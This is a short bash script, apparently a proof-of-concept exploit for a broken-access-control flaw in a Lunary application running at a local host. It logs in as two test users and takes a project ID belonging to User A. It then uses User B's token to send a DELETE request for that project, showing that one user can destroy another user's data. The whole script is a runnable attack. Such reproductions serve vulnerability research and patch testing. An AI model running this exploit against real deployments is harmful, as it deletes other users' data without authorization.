#!/bin/bash

# Check if jq is installed; install it if it's not
if ! command -v jq &> /dev/null; then
    echo "jq not found, installing..."
    apt-get update && apt-get install -y jq
fi

# Log in as User A
echo "Logging in as User A..."
login_response=$(curl -s -X POST http://lunary-app:3333/auth/login -H "Content-Type: application/json" -d '{"email":"user_a@exploit.com", "password":"secret_user_a_password"}')
user_a_token=$(echo $login_response | jq -r '.token')
echo "User A token: $user_a_token"

# Get User A's projects
user_a_projects=$(curl -s -H "Authorization: Bearer $user_a_token" http://lunary-app:3333/v1/projects)
# Extract the first project ID from User A's projects
project_id=$(echo $user_a_projects | grep -o '"id":"[^"]*' | head -1 | cut -d'"' -f4)

if [ -z "$project_id" ]; then
  echo "Failed to get project ID from User A"
  exit 1
fi

# Log in as User B
echo "Logging in as User B..."
login_response=$(curl -s -X POST http://lunary-app:3333/auth/login -H "Content-Type: application/json" -d '{"email":"user_b@exploit.com", "password":"secret_user_b_password"}')
user_b_token=$(echo $login_response | jq -r '.token')
echo "User B token: $user_b_token"

delete_response=$(curl -s -X DELETE "http://lunary-app:3333/v1/projects/$project_id" \
  -H "Authorization: Bearer $user_b_token" \
  -H "Content-Type: application/json" \
  -w "%{http_code}" \
  -o /dev/null)
echo "Delete response: $delete_response"